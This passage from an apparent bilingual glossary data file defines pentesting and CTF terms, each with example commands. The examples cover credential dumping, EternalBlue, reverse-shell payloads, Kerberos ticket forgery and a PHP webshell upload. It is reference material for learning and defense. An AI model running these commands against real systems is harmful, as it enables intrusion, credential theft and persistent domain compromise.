    aliases: ["Impacket", "impacket", "psexec", "smbexec", "wmiexec", "secretsdump"],
    definition: "Suite Python d'outils réseau pour Windows. psexec = shell SYSTEM via SMB. secretsdump = dump des hashes AD. GetUserSPNs = Kerberoasting. smbclient.py = client SMB.",
    definition_en: "Python suite of network tools for Windows. psexec = SYSTEM shell via SMB. secretsdump = dump AD hashes. GetUserSPNs = Kerberoasting. smbclient.py = SMB client.",
    example: "impacket-psexec admin:password@TARGET\nimpacket-secretsdump DOMAIN/admin:pass@DC_IP",
    tools: [],
    refs: ["github.com/fortra/impacket"]
  },

  // ── Exploitation réseau ─────────────────────────────────────────────────────
  {
    id: "eternalblue", name: "EternalBlue", fullName: "EternalBlue (MS17-010)", category: "exploit",
    aliases: ["EternalBlue", "EternalBlue", "MS17-010", "ms17-010"],
    definition: "Exploit NSA rendu public par ShadowBrokers en 2017. Exploit SMBv1 sur Windows XP/7/2008 non patché. Donne SYSTEM directement. Utilisé par WannaCry.",
    definition_en: "NSA exploit leaked by ShadowBrokers in 2017. Exploits SMBv1 on unpatched Windows XP/7/2008. Grants SYSTEM directly. Used by WannaCry.",
    example: "nmap -p 445 --script smb-vuln-ms17-010 TARGET\nmsfconsole > use exploit/windows/smb/ms17_010_eternalblue",
    tools: ["Metasploit", "AutoBlue"],
    refs: ["CVE-2017-0144"]
  },
  {
    id: "bluekeep", name: "BlueKeep", fullName: "BlueKeep (CVE-2019-0708)", category: "exploit",
    aliases: ["BlueKeep", "CVE-2019-0708"],
    definition: "Vulnérabilité RDP pré-authentification sur Windows 7/2008. Permet RCE sans credentials. Instable (crashe souvent la machine). Checker Metasploit disponible.",
    definition_en: "Pre-authentication RDP vulnerability on Windows 7/2008. Allows RCE without credentials. Unstable (often crashes the machine). Metasploit checker available.",
    example: "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\nset RHOSTS TARGET && run",
    tools: ["Metasploit"],
    refs: ["CVE-2019-0708"]
  },

  // ── CTF / Crypto / Stégo ────────────────────────────────────────────────────
  {
    id: "stego", name: "Stéganographie", fullName: "Stéganographie", category: "ctf",
    aliases: ["Stéganographie", "steganography", "steghide", "stegsolve", "zsteg", "binwalk"],
    definition: "Technique consistant à cacher de l'information dans des médias (images, audio, vidéo) sans que ce soit visible. Outils : steghide (JPEG), zsteg (PNG), binwalk (extraction), stegsolve (analyse bit planes).",
    definition_en: "Technique of hiding information in media (images, audio, video) without it being visible. Tools: steghide (JPEG), zsteg (PNG), binwalk (extraction), stegsolve (bit plane analysis).",
    example: "steghide extract -sf image.jpg\nzsteg image.png\nbinwalk -e image.png",
    tools: ["steghide", "zsteg", "binwalk", "stegsolve", "exiftool"],
    refs: []
  },
  {
    id: "hash", name: "Hash", fullName: "Fonction de Hachage", category: "ctf",
    aliases: ["Hash", "MD5", "SHA1", "SHA256", "bcrypt", "hashing"],
    definition: "Fonction à sens unique transformant des données en empreinte de taille fixe. MD5 = 32 hex, SHA1 = 40 hex, SHA256 = 64 hex, bcrypt = $2b$. Identifier avec hash-identifier ou hashid.",
    definition_en: "One-way function transforming data into a fixed-size fingerprint. MD5 = 32 hex, SHA1 = 40 hex, SHA256 = 64 hex, bcrypt = $2b$. Identify with hash-identifier or hashid.",
    example: "hash-identifier HASH\nhashid HASH\ncrackstation.net (rapide pour MD5/SHA1 courants)",
    example_en: "hash-identifier HASH\nhashid HASH\ncrackstation.net (fast for common MD5/SHA1)",
    tools: ["hash-identifier", "hashcat", "john", "crackstation.net"],
    refs: []
  },
  {
    id: "base64", name: "Base64", fullName: "Encodage Base64", category: "ctf",
    aliases: ["Base64", "base64", "base 64"],
    definition: "Encodage (pas chiffrement) représentant des données binaires en ASCII. Charset : A-Za-z0-9+/=. La longueur est toujours un multiple de 4. Souvent empilé avec d'autres encodages en CTF.",
    definition_en: "Encoding (not encryption) representing binary data as ASCII. Charset: A-Za-z0-9+/=. Length is always a multiple of 4. Often stacked with other encodings in CTF challenges.",
    example: "echo 'ENCODED' | base64 -d\npython3 -c \"import base64; print(base64.b64decode('ENCODED'))\"",
    tools: ["CyberChef"],
    refs: ["gchq.github.io/CyberChef"]
  },
  {
    id: "rot13", name: "ROT13 / Caesar", fullName: "ROT13 / Chiffre de César", category: "ctf",
    aliases: ["ROT13", "ROT-13", "Caesar", "César", "chiffre de césar"],
    definition: "Substitution simple décalant les lettres de l'alphabet. ROT13 = décalage de 13 (sa propre inverse). César = décalage variable 1-25. Facilement identifiable par le texte 'presque lisible'.",
    definition_en: "Simple substitution cipher shifting alphabet letters. ROT13 = shift of 13 (its own inverse). Caesar = variable shift 1-25. Easily identifiable by 'almost readable' text.",
    example: "echo 'MESSAGE' | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13\n# CyberChef ROT13 ou dcode.fr",
    example_en: "echo 'MESSAGE' | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13\n# CyberChef ROT13 or dcode.fr",
    tools: ["CyberChef", "dcode.fr"],
    refs: []
  },
  {
    id: "rsa", name: "RSA", fullName: "RSA (cryptographie)", category: "ctf",
    aliases: ["RSA", "factorisation", "factordb"],
    definition: "Chiffrement asymétrique. En CTF : chercher si N est factorisable (factordb.com), ou si e est petit (e=3), ou si le même N est réutilisé. phi=(p-1)(q-1), d=pow(e,-1,phi), m=pow(c,d,N).",
    definition_en: "Asymmetric encryption. In CTF: check if N is factorable (factordb.com), if e is small (e=3), or if the same N is reused. phi=(p-1)(q-1), d=pow(e,-1,phi), m=pow(c,d,N).",
    example: "# Factoriser sur factordb.com\npython3 -c 'p=...; q=...; e=65537; phi=(p-1)*(q-1); d=pow(e,-1,phi); print(pow(c,d,p*q))'",
    example_en: "# Factorize on factordb.com\npython3 -c 'p=...; q=...; e=65537; phi=(p-1)*(q-1); d=pow(e,-1,phi); print(pow(c,d,p*q))'",
    tools: ["factordb.com", "CyberChef", "SageMath"],
    refs: ["factordb.com"]
  },
  {
    id: "cyberchef", name: "CyberChef", fullName: "CyberChef", category: "ctf",
    aliases: ["CyberChef", "cyberchef"],
    definition: "Outil web développé par le GCHQ pour encoder/décoder/analyser des données. Mode 'Magic' = détection automatique de l'encodage. Indispensable pour les challenges crypto et encodage.",
    definition_en: "Web tool developed by GCHQ for encoding/decoding/analyzing data. 'Magic' mode = automatic encoding detection. Essential for crypto and encoding challenges.",
    example: "gchq.github.io/CyberChef\n# Recipe : From Base64 > ROT13 > To Hex > ...",
    tools: [],
    refs: ["gchq.github.io/CyberChef"]
  },
  {
    id: "cve", name: "CVE", fullName: "Common Vulnerabilities and Exposures", category: "general",
    aliases: ["CVE", "CVE-"],
    definition: "Identifiant standardisé pour les vulnérabilités connues. Format : CVE-ANNÉE-NUMÉRO. Chercher sur nvd.nist.gov, exploit-db.com ou directement avec searchsploit.",
    definition_en: "Standardized identifier for known vulnerabilities. Format: CVE-YEAR-NUMBER. Search on nvd.nist.gov, exploit-db.com, or directly with searchsploit.",
    example: "searchsploit CVE-2021-41773\nnvd.nist.gov/vuln/detail/CVE-2021-41773",
    tools: ["searchsploit", "Metasploit"],
    refs: ["cve.mitre.org", "nvd.nist.gov"]
  },
  {
    id: "poc", name: "PoC", fullName: "Proof of Concept", category: "general",
    aliases: ["PoC", "Proof of Concept", "proof of concept"],
    definition: "Code ou démonstration prouvant qu'une vulnérabilité est exploitable. Souvent trouvé sur GitHub, exploit-db ou packetstormsecurity. Doit toujours être lu avant d'être exécuté.",
    definition_en: "Code or demonstration proving that a vulnerability is exploitable. Often found on GitHub, exploit-db, or packetstormsecurity. Should always be read before being executed.",
    example: "# Chercher sur GitHub : CVE-XXXX-XXXXX PoC\n# Lire le code avant d'exécuter",
    example_en: "# Search on GitHub: CVE-XXXX-XXXXX PoC\n# Read the code before executing",
    tools: [],
    refs: ["exploit-db.com", "github.com"]
  },
  {
    id: "payload", name: "Payload", fullName: "Payload (charge utile)", category: "general",
    aliases: ["Payload", "payload", "shellcode"],
    definition: "Le code ou les données transmis pour exploiter une vulnérabilité. En Metasploit : stageless (/bin/shell_reverse_tcp) vs staged (shell/reverse_tcp). msfvenom génère des payloads personnalisés.",
    definition_en: "The code or data transmitted to exploit a vulnerability. In Metasploit: stageless (/bin/shell_reverse_tcp) vs staged (shell/reverse_tcp). msfvenom generates custom payloads.",
    example: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload",
    tools: ["msfvenom", "Metasploit"],
    refs: []
  },
  {
    id: "lse", name: "LSE", fullName: "Linux Smart Enumeration / linux-exploit-suggester", category: "privesc",
    aliases: ["linux-exploit-suggester", "LSE", "linux smart enumeration"],
    definition: "Deux outils complémentaires pour l'escalade Linux. linux-exploit-suggester (LES) compare la version du kernel ('uname -r') aux CVEs d'escalade connues (DirtyCow, DirtyPipe, etc.) et donne un score de probabilité. Linux Smart Enumeration (lse.sh) analyse l'environnement en niveaux : niveau 0 (rapide/essentiel), niveau 1 (plus d'info), niveau 2 (tout). Bonnes alternatives/compléments à LinPEAS.",
    definition_en: "Two complementary tools for Linux privilege escalation. linux-exploit-suggester (LES) compares the kernel version ('uname -r') against known escalation CVEs (DirtyCow, DirtyPipe, etc.) and gives a probability score. Linux Smart Enumeration (lse.sh) analyzes the environment in levels: level 0 (fast/essential), level 1 (more info), level 2 (everything). Good alternatives/complements to LinPEAS.",
    example: "# linux-exploit-suggester :\nbash linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh --uname 'Linux 4.4.0'\n# lse.sh :\nbash lse.sh -l 0  # rapide\nbash lse.sh -l 1  # detaillé",
    example_en: "# linux-exploit-suggester:\nbash linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh --uname 'Linux 4.4.0'\n# lse.sh:\nbash lse.sh -l 0  # fast\nbash lse.sh -l 1  # detailed",
    tools: ["LinPEAS"],
    refs: ["github.com/mzet-/linux-exploit-suggester", "github.com/diego-treitos/linux-smart-enumeration"]
  },
  {
    id: "pspy", name: "pspy", fullName: "pspy (process spy)", category: "privesc",
    aliases: ["pspy", "pspy64"],
    definition: "Moniteur de processus Linux sans droits root. Utilise inotify et /proc pour surveiller les nouveaux processus en temps réel. Révèle les commandes et arguments complets des processus lancés par d'autres utilisateurs, notamment les scripts cron exécutés en root. Indispensable pour détecter des crons vulnérables (scripts modifiables, appels relatifs exploitables). Versions : pspy32 (32-bit), pspy64 (64-bit). Laisser tourner 2-3 minutes pour capturer les crons à intervalles réguliers.",
    definition_en: "Linux process monitor without root privileges. Uses inotify and /proc to monitor new processes in real time. Reveals full commands and arguments of processes launched by other users, including cron scripts running as root. Essential for detecting vulnerable cron jobs (writable scripts, exploitable relative calls). Versions: pspy32 (32-bit), pspy64 (64-bit). Let it run 2-3 minutes to capture cron jobs at regular intervals.",
    example: "# Télécharger depuis l'attaquant :\nwget http://YOUR_IP:8000/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n./tmp/pspy64 -pf -i 1000  # -pf = print file events, -i = interval ms\n# Laisser tourner 2-5 min et observer les UID=0",
    example_en: "# Download from attacker:\nwget http://YOUR_IP:8000/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n./tmp/pspy64 -pf -i 1000  # -pf = print file events, -i = interval ms\n# Let it run 2-5 min and watch UID=0",
    tools: [],
    refs: ["github.com/DominicBreuker/pspy"]
  },
  {
    id: "evil_winrm", name: "evil-winrm", fullName: "evil-winrm", category: "tool",
    aliases: ["evil-winrm", "WinRM", "winrm"],
    definition: "Client WinRM (Windows Remote Management, port 5985/5986) pour obtenir un shell PowerShell. Supporte l'authentification par password, hash ou certificat.",
    definition_en: "WinRM client (Windows Remote Management, port 5985/5986) for obtaining a PowerShell shell. Supports authentication by password, hash, or certificate.",
    example: "evil-winrm -i TARGET -u admin -p password\nevil-winrm -i TARGET -u admin -H NTLM_HASH",
    tools: [],
    refs: ["github.com/Hackplayers/evil-winrm"]
  },

  // ── Exploitation Binaire ────────────────────────────────────────────────────
  {
    id: "buffer_overflow", name: "Buffer Overflow", fullName: "Buffer Overflow (BOF)", category: "exploit",
    aliases: ["Buffer Overflow", "BOF", "bof", "stack overflow", "stack smashing", "ret2libc", "ret2win"],
    definition: "Écriture au-delà des limites d'un buffer en mémoire, écrasant des données adjacentes sur la stack (EIP/RIP = adresse de retour). Technique de base : overwrite EIP pour rediriger l'exécution. Variantes : ret2win (sauter à une fonction gagnante), ret2libc (appeler system('/bin/sh')), ROP (chaînes de gadgets pour contourner NX/DEP). Protections à vérifier : ASLR, NX (non-executable stack), PIE, Stack Canary.",
    definition_en: "Writing beyond the bounds of a memory buffer, overwriting adjacent data on the stack (EIP/RIP = return address). Basic technique: overwrite EIP to redirect execution. Variants: ret2win (jump to a winning function), ret2libc (call system('/bin/sh')), ROP (gadget chains to bypass NX/DEP). Protections to check: ASLR, NX (non-executable stack), PIE, Stack Canary.",
    example: "# Vérifier protections :\nchecksec --file=./binary\n# Trouver l'offset :\npython3 -c \"import pwn; pwn.cyclic(200)\" | ./binary\n# Exploit basique Python :\npython3 -c \"print('A'*offset + 'BBBB')\" | ./binary\n# Avec pwntools :\nfrom pwn import *\np = process('./binary')\np.sendline(b'A'*64 + p32(0xdeadbeef))",
    example_en: "# Check protections:\nchecksec --file=./binary\n# Find offset:\npython3 -c \"import pwn; pwn.cyclic(200)\" | ./binary\n# Basic Python exploit:\npython3 -c \"print('A'*offset + 'BBBB')\" | ./binary\n# With pwntools:\nfrom pwn import *\np = process('./binary')\np.sendline(b'A'*64 + p32(0xdeadbeef))",
    tools: ["pwntools", "GDB/pwndbg", "radare2", "ROPgadget", "checksec"],
    refs: ["HackTricks Buffer Overflow", "exploit.education", "pwn.college"]
  },
  {
    id: "rop", name: "ROP", fullName: "Return-Oriented Programming", category: "exploit",
    aliases: ["ROP", "Return-Oriented Programming", "rop chain", "gadgets", "ROPgadget"],
    definition: "Technique d'exploitation avancée pour contourner NX/DEP (stack non exécutable). Au lieu d'injecter du shellcode, on chaîne des 'gadgets' existants dans le binaire ou les librairies (séquences de quelques instructions se terminant par ret). Permet d'appeler system('/bin/sh') ou exécuter des syscalls arbitraires. Outils : ROPgadget, ropper, pwntools ROP builder.",
    definition_en: "Advanced exploitation technique to bypass NX/DEP (non-executable stack). Instead of injecting shellcode, 'gadgets' existing in the binary or libraries (short instruction sequences ending in ret) are chained together. Allows calling system('/bin/sh') or executing arbitrary syscalls. Tools: ROPgadget, ropper, pwntools ROP builder.",
    example: "# Trouver des gadgets :\nROPgadget --binary ./binary --rop\nropper -f ./binary\n# Avec pwntools :\nfrom pwn import *\nelf = ELF('./binary')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh\\x00'))])\np.sendline(b'A'*offset + rop.chain())",
    example_en: "# Find gadgets:\nROPgadget --binary ./binary --rop\nropper -f ./binary\n# With pwntools:\nfrom pwn import *\nelf = ELF('./binary')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh\\x00'))])\np.sendline(b'A'*offset + rop.chain())",
    tools: ["ROPgadget", "ropper", "pwntools", "GDB/pwndbg"],
    refs: ["ROP Emporium", "pwn.college"]
  },
  {
    id: "format_string", name: "Format String", fullName: "Format String Attack", category: "exploit",
    aliases: ["Format String", "format string", "printf", "%x %n", "FSB"],
    definition: "Vulnérabilité quand une entrée utilisateur est passée directement à printf/sprintf sans format string fixe. Permet de lire la stack (%x, %p), lire des adresses arbitraires (%s avec offset), et écrire en mémoire (%n = écrit le nombre de chars imprimés). Exploitation : leak du canary ou de libc, puis overwrite d'une adresse de retour ou d'un pointeur GOT.",
    definition_en: "Vulnerability when user input is passed directly to printf/sprintf without a fixed format string. Allows reading the stack (%x, %p), reading arbitrary addresses (%s with offset), and writing to memory (%n = writes the number of chars printed). Exploit: leak the canary or libc, then overwrite a return address or GOT pointer.",
    example: "# Détection :\n./binary\n%x.%x.%x.%x  → fuite de la stack = vulnérable\n# Lire un offset spécifique :\n%7$p  → valeur à l'offset 7 sur la stack\n# Écrire avec pwntools :\nfrom pwn import *\npayload = fmtstr_payload(offset, {target_addr: value})",
    example_en: "# Detection:\n./binary\n%x.%x.%x.%x  → stack leak = vulnerable\n# Read specific offset:\n%7$p  → value at offset 7 on stack\n# Write with pwntools:\nfrom pwn import *\npayload = fmtstr_payload(offset, {target_addr: value})",
    tools: ["pwntools", "GDB/pwndbg"],
    refs: ["HackTricks Format Strings", "pwn.college"]
  },
  {
    id: "pwntools", name: "pwntools", fullName: "pwntools (CTF framework)", category: "tool",
    aliases: ["pwntools", "pwn", "from pwn import"],
    definition: "Framework Python incontournable pour le CTF et l'exploitation binaire. Fonctionnalités : interaction avec processus/sockets (process/remote), packing d'adresses (p32/p64/u32/u64), génération de cyclic patterns, construction de ROP chains, ELF parsing, shellcraft (génération de shellcode), heap interaction. Remplace pratiquement tous les scripts d'exploitation ad hoc.",
    definition_en: "Essential Python framework for CTF and binary exploitation. Features: process/socket interaction (process/remote), address packing (p32/p64/u32/u64), cyclic pattern generation, ROP chain building, ELF parsing, shellcraft (shellcode generation), heap interaction. Replaces almost all ad hoc exploitation scripts.",
    example: "from pwn import *\ncontext.arch = 'amd64'\np = process('./binary')   # ou remote('IP', PORT)\nelf = ELF('./binary')\nlibc = ELF('./libc.so.6')\n# Packing :\np64(0xdeadbeef)  # little-endian 8 bytes\n# Cyclic :\ncyclic(200)  # pattern\ncyclic_find(0x61616166)  # trouver offset\n# Envoyer/recevoir :\np.sendline(b'payload')\np.recvuntil(b'>')\np.interactive()",
    example_en: "from pwn import *\ncontext.arch = 'amd64'\np = process('./binary')   # or remote('IP', PORT)\nelf = ELF('./binary')\nlibc = ELF('./libc.so.6')\n# Packing:\np64(0xdeadbeef)  # little-endian 8 bytes\n# Cyclic:\ncyclic(200)  # pattern\ncyclic_find(0x61616166)  # find offset\n# Send/receive:\np.sendline(b'payload')\np.recvuntil(b'>')\np.interactive()",
    tools: [],
    refs: ["docs.pwntools.com", "github.com/Gallopsled/pwntools"]
  },
  {
    id: "gdb", name: "GDB/pwndbg", fullName: "GDB + pwndbg/peda/gef", category: "tool",
    aliases: ["GDB", "gdb", "pwndbg", "peda", "gef", "debugger"],
    definition: "GDB est le débogueur GNU standard sous Linux. Les plugins pwndbg, PEDA ou GEF l'améliorent considérablement pour l'exploitation : affichage des registres, stack, heap, backtrace coloré, commandes supplémentaires (heap, got, rop, pattern). Indispensable pour analyser les crashes, trouver les offsets, et déboguer les exploits.",
    definition_en: "GDB is the standard GNU debugger on Linux. Plugins pwndbg, PEDA, or GEF greatly improve it for exploitation: register display, stack, heap, colorized backtrace, extra commands (heap, got, rop, pattern). Essential for analyzing crashes, finding offsets, and debugging exploits.",
    example: "gdb ./binary\n# Dans gdb/pwndbg :\nrun\ninfo registers\nx/20wx $rsp      # examiner la stack\ndisas main       # désassembler\nb *main+42       # breakpoint\n# pwndbg :\nheap             # état du heap\ngot              # Global Offset Table\nrop --grep 'pop rdi'\ncyclic 200 | ./binary  # avec pattern",
    example_en: "gdb ./binary\n# In gdb/pwndbg:\nrun\ninfo registers\nx/20wx $rsp      # examine stack\ndisas main       # disassemble\nb *main+42       # breakpoint\n# pwndbg:\nheap             # heap state\ngot              # Global Offset Table\nrop --grep 'pop rdi'\ncyclic 200 | ./binary  # with pattern",
    tools: [],
    refs: ["github.com/pwndbg/pwndbg", "sourceware.org/gdb"]
  },
  {
    id: "ghidra", name: "Ghidra/IDA", fullName: "Ghidra / IDA Pro (Reverse Engineering)", category: "tool",
    aliases: ["Ghidra", "ghidra", "IDA", "IDA Pro", "reverse engineering", "decompiler", "disassembler", "radare2", "r2"],
    definition: "Outils de rétro-ingénierie pour analyser des binaires sans le code source. Ghidra = gratuit, développé par la NSA, décompilateur C intégré. IDA Pro = référence professionnelle, très cher. Radare2 = open-source, en ligne de commande. Fonctions clés : désassemblage, décompilation C-like, graphe de flux de contrôle, renommage de variables, analyse de strings. En CTF : chercher les strings cachées, comprendre les algorithmes de vérification de password.",
    definition_en: "Reverse engineering tools for analyzing binaries without source code. Ghidra = free, developed by the NSA, integrated C decompiler. IDA Pro = professional reference, expensive. Radare2 = open-source, command-line. Key features: disassembly, C-like decompilation, control flow graph, variable renaming, string analysis. In CTF: find hidden strings, understand password verification algorithms.",
    example: "# Ghidra (GUI) : File > Import > analyser > CodeBrowser\n# IDA Free : mêmes fonctions de base\n# Radare2 (CLI) :\nr2 ./binary\naaa          # analyser tout\nafl          # lister fonctions\npdf @ main   # désassembler main\nV            # mode visuel\n# Strings rapide :\nstrings ./binary | grep -i flag\nstrings ./binary | grep -i pass",
    example_en: "# Ghidra (GUI): File > Import > analyze > CodeBrowser\n# IDA Free: same basic features\n# Radare2 (CLI):\nr2 ./binary\naaa          # analyze all\nafl          # list functions\npdf @ main   # disassemble main\nV            # visual mode\n# Quick strings:\nstrings ./binary | grep -i flag\nstrings ./binary | grep -i pass",
    tools: ["strings", "ltrace", "strace"],
    refs: ["ghidra-sre.org", "radare.org"]
  },

  // ── Active Directory ────────────────────────────────────────────────────────
  {
    id: "bloodhound", name: "BloodHound", fullName: "BloodHound / SharpHound", category: "network",
    aliases: ["BloodHound", "SharpHound", "bloodhound", "AD graph", "Active Directory graph"],
    definition: "Outil d'analyse des chemins d'attaque dans Active Directory. SharpHound (ou bloodhound-python) collecte les données AD (ACLs, groupes, sessions, GPOs) et BloodHound les visualise sous forme de graphe. Permet de trouver automatiquement le chemin le plus court vers Domain Admin. Requêtes prédéfinies : 'Shortest Paths to Domain Admins', 'Find Kerberoastable Users', 'Find AS-REP Roastable Users'.",
    definition_en: "Tool for analyzing attack paths in Active Directory. SharpHound (or bloodhound-python) collects AD data (ACLs, groups, sessions, GPOs) and BloodHound visualizes them as a graph. Automatically finds the shortest path to Domain Admin. Predefined queries: 'Shortest Paths to Domain Admins', 'Find Kerberoastable Users', 'Find AS-REP Roastable Users'.",
    example: "# Collecte depuis Linux (sans compte) :\nbloodhound-python -u user -p pass -d domain.local -dc DC_IP -c All\n# Collecte depuis Windows :\n.\\SharpHound.exe -c All\n# Importer dans BloodHound puis :\n# Queries > 'Shortest Paths to Domain Admins'",
    example_en: "# Collect from Linux (no account needed):\nbloodhound-python -u user -p pass -d domain.local -dc DC_IP -c All\n# Collect from Windows:\n.\\SharpHound.exe -c All\n# Import into BloodHound then:\n# Queries > 'Shortest Paths to Domain Admins'",
    tools: ["BloodHound", "SharpHound", "bloodhound-python"],
    refs: ["github.com/BloodHoundAD/BloodHound", "github.com/dirkjanm/BloodHound.py"]
  },
  {
    id: "crackmapexec", name: "CrackMapExec", fullName: "CrackMapExec / NetExec", category: "tool",
    aliases: ["CrackMapExec", "crackmapexec", "cme", "NetExec", "nxc"],
    definition: "Outil tout-en-un pour l'audit de réseaux Windows/AD. Supporte SMB, WinRM, MSSQL, LDAP, RDP. Fonctionnalités : tester des credentials sur tout un réseau, énumération des partages/utilisateurs/groupes, exécution de commandes, dump de secrets (SAM, LSA, NTDS), modules (Mimikatz, etc.). NetExec (nxc) est le successeur actif de CME.",
    definition_en: "All-in-one tool for Windows/AD network auditing. Supports SMB, WinRM, MSSQL, LDAP, RDP. Features: test credentials across a whole network, enumerate shares/users/groups, execute commands, dump secrets (SAM, LSA, NTDS), modules (Mimikatz, etc.). NetExec (nxc) is the active successor to CME.",
    example: "# Tester credentials sur tout le réseau :\ncrackmapexec smb 192.168.1.0/24 -u admin -p password\n# Lister partages :\ncrackmapexec smb TARGET -u user -p pass --shares\n# Exécuter commande :\ncrackmapexec smb TARGET -u admin -p pass -x 'whoami'\n# Dump SAM :\ncrackmapexec smb TARGET -u admin -p pass --sam\n# Via hash :\ncrackmapexec smb TARGET -u admin -H NTLM_HASH",
    example_en: "# Test credentials on entire network:\ncrackmapexec smb 192.168.1.0/24 -u admin -p password\n# List shares:\ncrackmapexec smb TARGET -u user -p pass --shares\n# Execute command:\ncrackmapexec smb TARGET -u admin -p pass -x 'whoami'\n# Dump SAM:\ncrackmapexec smb TARGET -u admin -p pass --sam\n# Via hash:\ncrackmapexec smb TARGET -u admin -H NTLM_HASH",
    tools: ["impacket"],
    refs: ["github.com/Porchetta-Industries/CrackMapExec", "github.com/Pennyw0rth/NetExec"]
  },
  {
    id: "golden_ticket", name: "Golden Ticket", fullName: "Golden Ticket (Kerberos)", category: "network",
    aliases: ["Golden Ticket", "golden ticket", "KRBTGT", "krbtgt"],
    definition: "Attaque Kerberos créant un faux TGT (Ticket Granting Ticket) signé avec le hash du compte KRBTGT (le compte spécial qui signe tous les tickets dans un domaine AD). Nécessite d'abord d'obtenir le hash NTLM du compte KRBTGT (via DCSync ou dump du contrôleur de domaine). Permet ensuite de se faire passer pour n'importe quel utilisateur du domaine pour n'importe quelle durée, même après changement de mots de passe. Persistance totale jusqu'au reset du mot de passe KRBTGT (2 fois minimum).",
    definition_en: "Kerberos attack creating a forged TGT (Ticket Granting Ticket) signed with the KRBTGT account hash (the special account that signs all tickets in an AD domain). Requires first obtaining the NTLM hash of the KRBTGT account (via DCSync or DC dump). Then allows impersonating any domain user for any duration, even after password changes. Total persistence until KRBTGT password is reset (minimum twice).",
    example: "# 1. Obtenir hash KRBTGT (post-compromise DC) :\nimpacket-secretsdump DOMAIN/admin@DC_IP\n# Ou via Mimikatz : lsadump::dcsync /domain:domain.local /user:krbtgt\n# 2. Créer le Golden Ticket :\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local administrator\n# Ou Mimikatz :\nkerberos::golden /user:admin /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH\n# 3. Utiliser le ticket :\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass domain.local/administrator@DC_IP",
    example_en: "# 1. Get KRBTGT hash (post-compromise DC):\nimpacket-secretsdump DOMAIN/admin@DC_IP\n# Or via Mimikatz: lsadump::dcsync /domain:domain.local /user:krbtgt\n# 2. Create Golden Ticket:\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local administrator\n# Or Mimikatz:\nkerberos::golden /user:admin /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH\n# 3. Use the ticket:\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass domain.local/administrator@DC_IP",
    tools: ["Mimikatz", "impacket"],
    refs: ["HackTricks Golden Ticket"]
  },
  {
    id: "silver_ticket", name: "Silver Ticket", fullName: "Silver Ticket (Kerberos)", category: "network",
    aliases: ["Silver Ticket", "silver ticket", "TGS forgery"],
    definition: "Variante du Golden Ticket : faux TGS (Ticket Granting Service) signé avec le hash NTLM du compte de service cible (pas KRBTGT). Plus discret car ne contacte pas le KDC. Limité à un seul service (ex : CIFS pour SMB, HTTP pour IIS, MSSQL). Requiert le hash du compte machine ou de service, pas du compte KRBTGT.",
    definition_en: "Golden Ticket variant: forged TGS (Ticket Granting Service) signed with the target service account's NTLM hash (not KRBTGT). More discreet because it doesn't contact the KDC. Limited to a single service (e.g. CIFS for SMB, HTTP for IIS, MSSQL). Requires the machine or service account hash, not the KRBTGT account hash.",
    example: "# Forger un Silver Ticket (accès CIFS/SMB sur un serveur) :\nimpacket-ticketer -nthash MACHINE_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/SERVER.domain.local administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-smbclient -k -no-pass domain.local/administrator@SERVER.domain.local",
    example_en: "# Forge a Silver Ticket (CIFS/SMB access on a server):\nimpacket-ticketer -nthash MACHINE_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/SERVER.domain.local administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-smbclient -k -no-pass domain.local/administrator@SERVER.domain.local",
    tools: ["Mimikatz", "impacket"],
    refs: ["HackTricks Silver Ticket"]
  },

  // ── Web (termes manquants) ──────────────────────────────────────────────────
  {
    id: "file_upload", name: "File Upload Bypass", fullName: "Unrestricted File Upload", category: "web",
    aliases: ["File Upload", "file upload bypass", "upload", "webshell upload", "MIME type"],
    definition: "Vulnérabilité permettant d'uploader des fichiers dangereux (PHP, JSP, ASP) en contournant les filtres. Techniques de bypass : changer l'extension (.php → .php5/.phtml/.phar), modifier le Content-Type (image/jpeg), double extension (shell.php.jpg), null byte (shell.php%00.jpg), magic bytes (ajouter GIF89a en tête du fichier). Si le fichier est exécutable par le serveur web → RCE direct via webshell.",
    definition_en: "Vulnerability allowing upload of dangerous files (PHP, JSP, ASP) by bypassing filters. Bypass techniques: change extension (.php → .php5/.phtml/.phar), modify Content-Type (image/jpeg), double extension (shell.php.jpg), null byte (shell.php%00.jpg), magic bytes (add GIF89a header). If the file is executable by the web server → direct RCE via webshell.",
    example: "# Webshell PHP minimal :\n<?php system($_GET['cmd']); ?>\n# Extensions alternatives :\n.php .php3 .php4 .php5 .phtml .phar .shtml\n# Header magic bytes (bypass filetype check) :\nGIF89a <?php system($_GET['cmd']); ?>\n# Burp : changer Content-Type: image/jpeg\n# Si uploadé dans /uploads/ :\ncurl http://TARGET/uploads/shell.php?cmd=id",
    example_en: "# Minimal PHP webshell:\n<?php system($_GET['cmd']); ?>\n# Alternative extensions:\n.php .php3 .php4 .php5 .phtml .phar .shtml\n# Magic bytes header (bypass filetype check):\nGIF89a <?php system($_GET['cmd']); ?>\n# Burp: change Content-Type: image/jpeg\n# If uploaded in /uploads/:\ncurl http://TARGET/uploads/shell.php?cmd=id",
    tools: ["Burp Suite", "weevely"],
    refs: ["HackTricks File Upload", "PayloadsAllTheThings File Upload"]
  },
  {
    id: "deserialization", name: "Désérialisation", fullName: "Insecure Deserialization", category: "web",
    aliases: ["Désérialisation", "Deserialization", "insecure deserialization", "pickle", "ysoserial", "Java deserialization"],
